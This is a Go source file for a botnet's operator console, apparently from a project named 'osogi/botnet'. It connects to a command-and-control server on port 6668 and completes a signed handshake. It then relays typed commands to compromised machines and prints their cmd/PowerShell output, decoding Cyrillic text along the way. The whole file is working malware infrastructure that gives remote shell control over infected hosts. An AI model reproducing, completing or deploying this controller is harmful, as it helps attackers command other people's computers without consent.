package main

/*
go build -o controler.exe .\botnet\botnet_files\controler.go
*/
import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/osogi/botnet"
)

const server_ip string = "127.0.0.1:6668"

func coding_resurect(mes []byte) string {
	//cmd и powershell используют странную кодировку
	first_arr := []rune("АБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмноп") //128-175
	second_arr := []rune("рстуфхцчшщъыьэюяЁё")                              //224-241
	res := ""
	for i := 0; i < len(mes); i++ {
		if (128 <= mes[i]) && (mes[i] <= 176) {
			res += string(first_arr[mes[i]-128])
		} else if (224 <= mes[i]) && (mes[i] <= 241) {
			res += string(second_arr[mes[i]-224])
		} else {
			res += string(mes[i])
		}

	}
	return res
}

func main() {
	var seed int64
	conn, err := net.Dial("tcp", server_ip)
	if err == nil {
		buf := make([]byte, 16)
		conn.Write([]byte("ch4nnel1"))
		conn.Read(buf)
		seed, _ = binary.Varint(buf)
		seed = botnet.ControlSign(seed, make([]byte, 0), 0)
		binary.PutVarint(buf, seed)
		conn.Write(buf)
		conn.Read(buf)
		if string(buf[0:4]) == "Live" {
			fmt.Println("Сonnection established")
		}
	} else {
		fmt.Println(err)
		os.Exit(0)
	}
	message := make([]byte, 0)
	for {

		message, seed = botnet.GetPac(conn, seed, 120, botnet.ControlSign)
		if string(message) == "\x08$\xfc*^\x15" {
			input, _, _ := bufio.NewReader(os.Stdin).ReadLine()
			seed = botnet.SendPac(conn, input, seed, botnet.ControlSign)
		} else {

			fmt.Print(coding_resurect(message))
		}

	}
}
